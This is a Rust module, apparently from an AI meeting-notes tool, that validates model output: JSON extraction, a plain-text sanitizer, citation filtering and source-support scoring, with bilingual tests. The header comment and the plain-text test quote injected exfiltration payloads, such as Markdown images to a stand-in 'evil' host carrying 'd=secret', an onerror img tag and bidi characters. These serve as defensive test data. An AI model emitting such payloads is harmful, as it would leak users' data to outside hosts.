// SPDX-License-Identifier: Apache-2.0
//! Checks on model output, shared by notes, enhance and ask.
//!
//! - [`extract_json`]: the JSON object in a reply (tolerates code fences, a
//!   stray `<think>` block, text around the object).
//! - [`plain_text`]: model output is plain text (RT-6): Markdown images and
//!   links, HTML tags and invisible/bidi control characters are removed, so a
//!   transcript that says "output ![x](https://evil/?d=...)" can't make the
//!   notes load or link anything.
//! - [`Cites`]: citation ids must name segments that were in the prompt;
//!   anything else is dropped, and an AI item left without a citation is
//!   dropped too (every AI sentence carries at least one valid anchor).
//! - [`supported`]: a soft check that a claim shares words with what it
//!   cites (counted, not enforced: paraphrase and translation are normal).

use std::collections::HashSet;
use std::sync::LazyLock;

use regex::Regex;
use serde::Serialize;
use serde_json::Value;

use crate::schema::MAX_CITES;
use crate::transcript::Segment;

/// What validation changed or noticed; reported with the result.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
pub struct Diagnostics {
    /// Model calls made (including retries).
    pub requests: u32,
    /// Retries after invalid output.
    pub retries: u32,
    pub tokens_in: u64,
    pub tokens_out: u64,
    /// AI items removed because none of their citations was valid.
    pub dropped_items: u32,
    /// Citations removed (unknown segment id or duplicates).
    pub dropped_cites: u32,
    /// Items whose text scores below [`WEAK_BELOW`] against the segments they cite.
    pub weak_anchors: u32,
    /// Action items whose owner wasn't a speaker of the cited segments.
    pub unassigned_owners: u32,
    /// Decisions the model gave no status; kept as proposed (never over-claim
    /// a commitment).
    pub missing_status: u32,
    /// Items cut because a list was longer than allowed.
    pub truncated_lists: u32,
    /// Repeated items removed (same text after folding, in the same list).
    pub duplicates: u32,
    /// Citations moved to a neighbouring segment that matches clearly better.
    pub snapped_cites: u32,
}

impl Diagnostics {
    pub fn add(&mut self, o: &Diagnostics) {
        self.requests += o.requests;
        self.retries += o.retries;
        self.tokens_in += o.tokens_in;
        self.tokens_out += o.tokens_out;
        self.dropped_items += o.dropped_items;
        self.dropped_cites += o.dropped_cites;
        self.weak_anchors += o.weak_anchors;
        self.unassigned_owners += o.unassigned_owners;
        self.missing_status += o.missing_status;
        self.truncated_lists += o.truncated_lists;
        self.duplicates += o.duplicates;
        self.snapped_cites += o.snapped_cites;
    }
}

/// The JSON object in a model reply.
pub fn extract_json(text: &str) -> Result<Value, String> {
    let text = strip_think(text);
    let start = text.find('{').ok_or("no JSON object in the reply")?;
    let end = text.rfind('}').ok_or("the JSON object is not closed")?;
    if end < start {
        return Err("no JSON object in the reply".into());
    }
    serde_json::from_str(&text[start..=end]).map_err(|e| format!("invalid JSON: {e}"))
}

fn strip_think(text: &str) -> &str {
    match (text.find("<think>"), text.find("</think>")) {
        (Some(a), Some(b)) if a < b => &text[b + "</think>".len()..],
        _ => text,
    }
}

/// `](target)` / `]: target` after any bracket text, nested or not: what
/// makes Markdown a link or an image. The target is removed, whatever the
/// brackets hold.
static MD_TARGET: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\]\s*(?:\([^)]*\)?|:\s*\S+)").expect("valid regex"));
/// Link and image brackets left after the targets are gone.
static MD_BRACKETS: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"!?\[|\]").expect("valid regex"));
static HTML_TAG: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"</?[A-Za-z!][^<>]*>").expect("valid regex"));
/// Redaction placeholders (`<<EMAIL_1>>`) look like tags; they are kept,
/// including the one-bracket form a model may write (`<EMAIL_1>`), which
/// would otherwise be removed as a tag before the value can be restored.
static PLACEHOLDER: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"<{1,2}([A-Z]+_[0-9]+)>{1,2}").expect("valid regex"));
static PROTECTED: LazyLock<Regex> =
    LazyLock::new(|| Regex::new("\u{E000}([A-Z]+_[0-9]+)\u{E001}").expect("valid regex"));
static BULLET: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^\s*(?:[-*•]+|#+|\d+[.)])\s+").expect("valid regex"));

/// Zero-width, bidi-override and other invisible formatting characters.
fn invisible(c: char) -> bool {
    matches!(c,
        '\u{00AD}' | '\u{061C}' | '\u{180E}' | '\u{200B}'..='\u{200F}' |
        '\u{202A}'..='\u{202E}' | '\u{2060}'..='\u{2064}' | '\u{2066}'..='\u{2069}' |
        '\u{FEFF}' | '\u{FFF9}'..='\u{FFFB}' | '\u{E0000}'..='\u{E007F}')
}

/// Model (or user) text reduced to one line of plain text.
pub fn plain_text(text: &str) -> String {
    let cleaned: String = text
        .chars()
        .filter(|c| !invisible(*c) && !('\u{E000}'..='\u{E001}').contains(c))
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect();
    let s = PLACEHOLDER.replace_all(&cleaned, "\u{E000}${1}\u{E001}");
    let s = MD_TARGET.replace_all(&s, "");
    let s = MD_BRACKETS.replace_all(&s, "");
    let s = HTML_TAG.replace_all(&s, "");
    let s = BULLET.replace(&s, "");
    let s = PROTECTED.replace_all(&s, "<<$1>>");
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Filters citations against the ids a request was allowed to cite.
pub struct Cites<'a> {
    allowed: &'a dyn Fn(u64) -> bool,
}

impl<'a> Cites<'a> {
    pub fn new(allowed: &'a dyn Fn(u64) -> bool) -> Cites<'a> {
        Cites { allowed }
    }

    pub fn allows(&self, id: u64) -> bool {
        (self.allowed)(id)
    }

    /// Valid, distinct ids in order (at most [`MAX_CITES`]).
    pub fn keep(&self, raw: &[i64], diag: &mut Diagnostics) -> Vec<u64> {
        let mut out: Vec<u64> = Vec::new();
        for &id in raw {
            match u64::try_from(id) {
                Ok(id) if (self.allowed)(id) && !out.contains(&id) && out.len() < MAX_CITES => {
                    out.push(id)
                }
                _ => diag.dropped_cites += 1,
            }
        }
        out
    }
}

/// Content words: folded tokens of 3+ chars, or any token with a digit.
pub(crate) fn content_words(text: &str) -> HashSet<String> {
    ghi_text::tokens(&ghi_text::fold(text))
        .into_iter()
        .map(|(_, t)| t)
        .filter(|t| t.chars().count() >= 3 || t.chars().any(|c| c.is_ascii_digit()))
        .collect()
}

/// Small models often cite the line next to the one they used. When a
/// segment within two places of a citation (`near` lists the candidates)
/// shares at least two more content words with `text`, and at least three in
/// all, the citation moves there. Same-language text only.
pub fn snap<'s>(
    text: &str,
    cites: &mut Vec<u64>,
    near: impl Fn(u64) -> Vec<&'s Segment>,
    get: impl Fn(u64) -> Option<&'s Segment>,
    d: &mut Diagnostics,
) {
    let words = content_words(text);
    let score = |s: &Segment| content_words(&s.text).intersection(&words).count();
    for c in cites.iter_mut() {
        let own = get(*c).map_or(0, score);
        if let Some(best) = near(*c)
            .into_iter()
            .max_by_key(|s| (score(s), std::cmp::Reverse(s.id)))
            && score(best) >= own + 2
            && score(best) >= 3
        {
            *c = best.id;
            d.snapped_cites += 1;
        }
    }
    let mut seen = HashSet::new();
    cites.retain(|c| seen.insert(*c));
}

/// True when `text` shares a content word with the cited segments. The looser,
/// older rule (any one word), still used by `enhance`; notes use the graded
/// [`source_score`] instead.
pub fn supported(text: &str, cited: &[&Segment]) -> bool {
    let words = content_words(text);
    cited
        .iter()
        .any(|s| !content_words(&s.text).is_disjoint(&words))
}

/// A claim is weak (worth a second look) when less than this share of its
/// content words is found in the lines it cites. Calibrated by
/// `source_score_separates_good_cites_from_wrong_ones`; the only place the
/// threshold lives.
pub const WEAK_BELOW: f32 = 0.34;

/// Words too common to say anything about a source (EN + VI), as written;
/// compared folded.
const STOPWORDS: &[&str] = &[
    // English
    "the",
    "and",
    "for",
    "with",
    "that",
    "this",
    "these",
    "those",
    "from",
    "are",
    "was",
    "were",
    "will",
    "would",
    "should",
    "could",
    "can",
    "has",
    "have",
    "had",
    "been",
    "being",
    "not",
    "but",
    "also",
    "its",
    "their",
    "there",
    "then",
    "than",
    "into",
    "about",
    "over",
    "out",
    "all",
    "any",
    "who",
    "what",
    "when",
    "where",
    "which",
    "how",
    "why",
    "our",
    "your",
    "they",
    "them",
    "she",
    "his",
    "her",
    "you",
    "just",
    "more",
    "some",
    "one",
    "per",
    "via",
    "need",
    "needs",
    "agreed",
    "discussed",
    "team",
    "meeting",
    // Vietnamese
    "và",
    "của",
    "là",
    "có",
    "không",
    "được",
    "cho",
    "này",
    "với",
    "những",
    "các",
    "một",
    "trong",
    "để",
    "khi",
    "thì",
    "sẽ",
    "đã",
    "rồi",
    "nhé",
    "ạ",
    "cũng",
    "như",
    "nên",
    "cần",
    "phải",
    "vào",
    "ra",
    "đến",
    "từ",
    "về",
    "mà",
    "hay",
    "hoặc",
    "nhưng",
    "vì",
    "nếu",
    "đó",
    "cả",
    "mình",
    "chúng",
    "tôi",
    "anh",
    "chị",
    "em",
    "ông",
    "bà",
    "người",
    "việc",
    "đang",
    "vẫn",
    "còn",
    "thêm",
    "nhóm",
    "họp",
    "cuộc",
];

static STOP: LazyLock<HashSet<String>> =
    LazyLock::new(|| STOPWORDS.iter().map(|w| ghi_text::fold(w)).collect());

/// The words a claim or a source line is compared by: folded (so Vietnamese
/// matches with or without marks) and stopwords removed. English words keep
/// a five-letter stem ("decided" meets "decide") and need three letters.
/// Vietnamese (any diacritic in the text) is made of short syllables, so they
/// are kept whole and two letters are enough ("đi", "xe", "ba").
pub fn claim_words(text: &str) -> HashSet<String> {
    let vi = ghi_text::has_diacritics(text);
    let min = if vi { 2 } else { 3 };
    ghi_text::tokens(&ghi_text::fold(text))
        .into_iter()
        .map(|(_, t)| t)
        .filter(|t| t.chars().count() >= min || t.chars().any(|c| c.is_ascii_digit()))
        .filter(|t| !STOP.contains(t))
        .map(|w| {
            if !vi && w.chars().count() > 5 {
                w.chars().take(5).collect()
            } else {
                w
            }
        })
        .collect()
}

/// The share (0 to 1) of the claim's content words found in the cited lines'
/// words ([`claim_words`] of each), or `None` when there is nothing to
/// compare (no content words in the claim, or no cited line).
pub fn source_score(claim: &HashSet<String>, cited: &[&HashSet<String>]) -> Option<f32> {
    if claim.is_empty() || cited.is_empty() {
        return None;
    }
    let found = claim
        .iter()
        .filter(|w| cited.iter().any(|c| c.contains(*w)))
        .count();
    Some(found as f32 / claim.len() as f32)
}

/// Whether a score says to check the source.
pub fn is_weak(score: f32) -> bool {
    score < WEAK_BELOW
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::transcript::tests::seg;

    #[test]
    fn finds_the_object_around_noise() {
        let v = extract_json("<think>\nhmm {\n</think>\n```json\n{\"a\": [1]}\n```").unwrap();
        assert_eq!(v["a"][0], 1);
        assert!(extract_json("no json here").is_err());
        assert!(extract_json("{\"a\": ").is_err());
    }

    #[test]
    fn output_is_plain_text() {
        let evil = "Sent ![x](https://evil/?d=secret) the [doc](https://evil/a) <img src=x onerror=y> \
                    <a href=\"https://evil\">here</a>\u{202E}gnp.exe\u{200B}";
        let clean = plain_text(evil);
        for bad in [
            "![",
            "](",
            "<img",
            "<a ",
            "https://evil",
            "\u{202E}",
            "\u{200B}",
        ] {
            assert!(!clean.contains(bad), "{bad} in {clean}");
        }
        assert_eq!(clean, "Sent x the doc heregnp.exe");
        // Nested brackets and reference-style targets don't get through either.
        for evil in [
            "![a[b]c](https://evil/?d=1)",
            "[x[y]z](https://evil)",
            "see [doc][1]\n[1]: https://evil",
            "tag\u{E0041}\u{E0042}s",
        ] {
            let c = plain_text(evil);
            for bad in ["](", "![", "https://evil", "\u{E0041}"] {
                assert!(!c.contains(bad), "`{bad}` in {c:?} from {evil:?}");
            }
        }
        assert_eq!(plain_text("- **Chốt** scope\n  nhé"), "**Chốt** scope nhé");
        // Placeholders and plain URLs stay (shown as text, never as links).
        assert_eq!(plain_text("mail <EMAIL_1> now"), "mail <<EMAIL_1>> now");
        assert_eq!(
            plain_text("mail <<EMAIL_1>> or see https://example.com"),
            "mail <<EMAIL_1>> or see https://example.com"
        );
    }

    #[test]
    fn keeps_only_allowed_distinct_cites() {
        let allowed = |id: u64| id < 10;
        let c = Cites::new(&allowed);
        let mut d = Diagnostics::default();
        assert_eq!(c.keep(&[3, 3, -1, 42, 4], &mut d), vec![3, 4]);
        assert_eq!(d.dropped_cites, 3);
    }

    #[test]
    fn off_by_one_citations_snap_to_the_matching_neighbour() {
        let a = seg(
            0,
            0.0,
            1.0,
            "S1",
            "Chào mọi người, hôm nay họp về kế hoạch beta",
            "vi",
        );
        let b = seg(
            1,
            1.0,
            2.0,
            "S2",
            "Bản build đã xong, còn đồng bộ lịch",
            "vi",
        );
        let segs = [a, b];
        let get = |id: u64| segs.iter().find(|s| s.id == id);
        let near = |_: u64| segs.iter().collect::<Vec<_>>();
        let mut d = Diagnostics::default();
        let mut cites = vec![1];
        snap(
            "Hôm nay họp về kế hoạch beta",
            &mut cites,
            near,
            get,
            &mut d,
        );
        assert_eq!((cites, d.snapped_cites), (vec![0], 1));
        // A citation that already matches stays.
        let mut cites = vec![1];
        snap(
            "Build xong, còn đồng bộ lịch",
            &mut cites,
            near,
            get,
            &mut d,
        );
        assert_eq!(cites, vec![1]);
    }

    #[test]
    fn support_is_word_overlap_after_folding() {
        let s = seg(0, 0.0, 1.0, "S1", "Mình chốt scope cho bản beta nhé", "vi");
        assert!(supported("Chot scope beta", &[&s]));
        assert!(!supported("Budget approved", &[&s]));
    }

    /// Claims as a model words them (paraphrased, not copied), with the lines
    /// they come from, for the EN, VI and clinic goldens. `loose` ones share
    /// almost no word with their line (synonyms): reported, not required.
    #[rustfmt::skip]
    const GOOD: &[(&str, &str, &[u64], &str)] = &[
        ("en", "Beta will ship without calendar sync", &[4], ""),
        ("en", "Calendar sync was unstable, with two crashes last week", &[3], ""),
        ("en", "The build is ready except the calendar sync feature", &[1], ""),
        ("en", "Release notes will be written and sent to everyone by Thursday", &[6], ""),
        ("en", "Marketing suggested nine dollars per month for the paid plan, finance has not confirmed", &[8], ""),
        ("en", "Pricing is not decided until finance provides numbers", &[9], ""),
        ("en", "Whether to offer an early-user discount stays open", &[10, 11], ""),
        ("en", "Ask finance for the cost numbers before Monday", &[12], ""),
        ("en", "Forty support tickets are unanswered", &[13], ""),
        ("en", "Clear the support queue on Friday afternoon", &[14], ""),
        ("en", "The security review on the fifteenth needs the encryption design document first", &[15, 16], ""),
        ("en", "Send the encryption design document to the auditors tomorrow", &[17], ""),
        ("en", "The onboarding video is too long, users skip it; cut it under two minutes", &[18, 19], ""),
        ("en", "Edit the onboarding video next week", &[20], ""),
        ("en", "Leave the calendar feature out of the first beta", &[4], ""),
        ("clinic", "Blood pressure was 135 over 85 and 140 over 90, above the target", &[3, 4], ""),
        ("clinic", "Headaches for about 2 weeks, mostly in the evening", &[1], ""),
        ("clinic", "Keep the 5 milligram tablet once a day and cut down on salt and coffee", &[6], ""),
        ("clinic", "Limit ibuprofen to 2 tablets a day and not more than 3 days in a row", &[9], ""),
        ("clinic", "Drink at least 2 liters of water a day and go to bed before 11", &[7], ""),
        ("clinic", "Write down blood pressure morning and evening and when each headache starts", &[11], ""),
        ("clinic", "Next visit on Tuesday the 14th at 9:30", &[13], ""),
        ("clinic", "Call the clinic if the headache suddenly gets much worse", &[15], ""),
        ("clinic", "The patient wants to ask about a blood test next time", &[14], ""),
        ("vi", "Bản beta ra mắt không có đồng bộ lịch", &[4], ""),
        ("vi", "Đồng bộ lịch bị lỗi sập hai lần tuần trước", &[3], ""),
        ("vi", "Bản build đã xong, chỉ còn tính năng đồng bộ lịch chưa ổn", &[1], ""),
        ("vi", "Viết ghi chú phát hành và gửi cả nhóm trước thứ Năm", &[6], ""),
        ("vi", "Marketing đề xuất giá chín mươi chín nghìn một tháng, tài chính chưa xác nhận", &[8], ""),
        ("vi", "Chưa chốt giá, cần số liệu từ bộ phận tài chính", &[9], ""),
        ("vi", "Việc giảm giá cho người dùng sớm vẫn để mở", &[10, 11], ""),
        ("vi", "Hỏi tài chính số liệu chi phí trước thứ Hai", &[12], ""),
        ("vi", "Hộp thư hỗ trợ có bốn mươi yêu cầu chưa trả lời", &[13], ""),
        ("vi", "Xử lý hết hàng đợi hỗ trợ vào chiều thứ Sáu", &[14], ""),
        ("vi", "Buổi đánh giá bảo mật ngày mười lăm, kiểm toán cần tài liệu thiết kế mã hóa trước", &[15, 16], ""),
        ("vi", "Gửi tài liệu thiết kế mã hóa cho bên kiểm toán vào ngày mai", &[17], ""),
        ("vi", "Video hướng dẫn quá dài, rút xuống dưới hai phút", &[18, 19], ""),
        ("vi", "Dựng lại video hướng dẫn vào tuần sau", &[20], ""),
        ("vi", "Thống nhất để tính năng lịch cho bản sau", &[2, 4], ""),
        ("vi", "Không chép nguyên văn: ra mắt beta không đồng bộ lịch", &[2], ""),
        ("en", "The group postponed the calendar integration to a later release", &[2, 4], "loose"),
        ("en", "Finance must supply figures before any price is fixed", &[9], "loose"),
        ("en", "A shorter intro clip was requested for new users", &[19], "loose"),
        ("clinic", "Hypertension readings slightly exceed the goal", &[4], "loose"),
        ("clinic", "Patient told to avoid painkillers beyond a small daily amount", &[9], "loose"),
        ("vi", "Nhóm hoãn việc tích hợp lịch sang phiên bản kế tiếp", &[2, 4], "loose"),
        ("vi", "Chưa xác định mức giá cho gói trả tiền", &[9], "loose"),
        ("vi", "Phải rút ngắn clip giới thiệu cho người mới", &[19], "loose"),
    ];

    fn golden_lines(name: &str) -> Vec<String> {
        let raw = match name {
            "en" => include_str!("../tests/golden/en.transcript.json"),
            "vi" => include_str!("../tests/golden/vi.transcript.json"),
            _ => include_str!("../tests/golden/consultation.transcript.json"),
        };
        let doc: Value = serde_json::from_str(raw).unwrap();
        doc["segments"]
            .as_array()
            .unwrap()
            .iter()
            .map(|s| s["text"].as_str().unwrap().to_string())
            .collect()
    }

    fn score_of(claim: &str, ids: &[u64], lines: &[String]) -> Option<f32> {
        let cited: Vec<HashSet<String>> = ids
            .iter()
            .map(|&i| claim_words(&lines[i as usize]))
            .collect();
        let cited: Vec<&HashSet<String>> = cited.iter().collect();
        source_score(&claim_words(claim), &cited)
    }

    /// Weak flags on good cites and on seeded wrong ones (a line elsewhere in
    /// the meeting), per language: the threshold's calibration.
    #[test]
    fn source_score_separates_good_cites_from_wrong_ones() {
        for (lang, langs) in [
            ("EN", ["en", "clinic"].as_slice()),
            ("VI", ["vi"].as_slice()),
        ] {
            let (mut good, mut good_weak, mut bad, mut bad_weak) = (0, 0, 0, 0);
            let (mut near, mut near_weak) = (0, 0);
            let mut missed = Vec::new();
            let (mut loose, mut loose_weak) = (0, 0);
            for (src, claim, ids, kind) in GOOD.iter().filter(|g| langs.contains(&g.0)) {
                let lines = golden_lines(src);
                let n = lines.len() as u64;
                let g = score_of(claim, ids, &lines).unwrap();
                if *kind == "loose" {
                    loose += 1;
                    loose_weak += usize::from(is_weak(g));
                } else {
                    good += 1;
                    if is_weak(g) {
                        good_weak += 1;
                        missed.push(format!("good flagged {g:.2}: {claim}"));
                    }
                }
                // Seeded wrong cite: lines 7 and 11 further on (wrapping), not near the right ones.
                for shift in [7, 11, 1, 2] {
                    let wrong: Vec<u64> = ids.iter().map(|i| (i + shift) % n).collect();
                    if wrong.iter().any(|w| ids.contains(w)) {
                        continue;
                    }
                    let b = score_of(claim, &wrong, &lines).unwrap();
                    // Next door (+1, +2) is reported only: the snap step
                    // handles neighbours and word overlap cannot tell them apart.
                    let far = shift > 2;
                    if far {
                        bad += 1;
                    }
                    if is_weak(b) {
                        if far {
                            bad_weak += 1;
                        } else {
                            near_weak += 1;
                        }
                    } else if far {
                        missed.push(format!("bad passed {b:.2}: {claim} -> {wrong:?}"));
                    }
                    if !far {
                        near += 1;
                    }
                }
            }
            eprintln!(
                "{lang}: good flagged {good_weak}/{good}, wrong flagged {bad_weak}/{bad} (next-door wrong: {near_weak}/{near}; loose paraphrase flagged {loose_weak}/{loose})\n{}",
                missed.join("\n")
            );
            assert!(
                good_weak * 10 <= good,
                "{lang}: {good_weak} of {good} good cites flagged"
            );
            assert!(
                bad_weak * 10 >= bad * 6,
                "{lang}: only {bad_weak} of {bad} wrong cites flagged"
            );
        }
    }

    #[test]
    fn source_score_edge_cases() {
        let words = |t: &str| claim_words(t);
        // Nothing to compare: no score, never "weak".
        assert_eq!(
            source_score(&words("the and of"), &[&words("anything")]),
            None
        );
        assert_eq!(source_score(&words("ship friday"), &[]), None);
        // Vietnamese matches with or without marks, and stems meet.
        let line = words("Chốt lịch beta, đã quyết định");
        assert_eq!(source_score(&words("chot lich beta"), &[&line]), Some(1.0));
        assert_eq!(
            source_score(&words("deciding"), &[&words("decided")]),
            Some(1.0)
        );
        assert!(is_weak(0.0) && !is_weak(1.0));
    }
}
